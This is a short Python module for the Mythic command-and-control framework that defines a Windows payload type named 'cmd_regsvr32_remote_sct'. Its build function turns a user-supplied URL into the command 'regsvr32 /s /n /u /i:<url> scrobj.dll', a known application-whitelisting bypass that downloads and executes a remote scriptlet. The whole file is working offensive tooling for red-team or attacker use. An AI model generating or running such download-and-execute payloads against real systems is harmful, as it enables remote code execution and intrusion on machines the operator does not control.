import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os


class cmd_regsvr32_remote_sct(PayloadType):
    name = "cmd_regsvr32_remote_sct"
    file_extension = "cmd"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    note = """Executes regsvr32.exe pointing to an URL with a SCT file"""
    supports_dynamic_loading = True
    c2_profiles = []
    mythic_encrypts = True
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "cmd"
    agent_icon_path = agent_path / "agent_functions" / "basic_python_agent.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "url",
            parameter_type=BuildParameterType.String,
            description="SCT payload URL",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            url = self.get_parameter('url')

            payload = "regsvr32 /s /n /u /i:%s scrobj.dll" % url

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
